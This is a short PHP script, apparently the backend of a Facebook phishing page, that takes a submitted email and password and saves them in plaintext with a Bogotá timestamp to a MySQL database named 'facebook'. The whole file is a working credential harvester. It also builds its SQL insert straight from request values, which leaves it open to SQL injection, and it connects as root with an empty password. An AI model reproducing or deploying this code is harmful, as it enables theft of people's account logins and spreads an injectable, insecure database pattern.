<?php

$server = "localhost";
$user = "root";
$password = "";
$db = "facebook";

$conexion = mysqli_connect($server, $user, $password, $db);

$email = $_REQUEST['email'];
$pass = $_REQUEST['password'];

date_default_timezone_set("America/Bogota");

$fecha = date('Y-m-d H:i:s');

if ($conexion->connect_errno) {

    die("Conexión Fallida" . $conexion->connect_errno);
} else {
}


$database =  mysqli_select_db($conexion, $db);




if (!$database) {


    echo "No se pudo encontrar la tabla";
} else {
}

$instrucction_SQL = "INSERT INTO datos (email,password, fecha) VALUES ('$email', '$pass', '$fecha')";

$resultado = mysqli_query($conexion, $instrucction_SQL);

$consulta = "SELECT * FROM datos";

$result = mysqli_query($conexion, $consulta);



if (!$result) {

    echo "No se encontro la consulta";
}

mysqli_close($conexion);
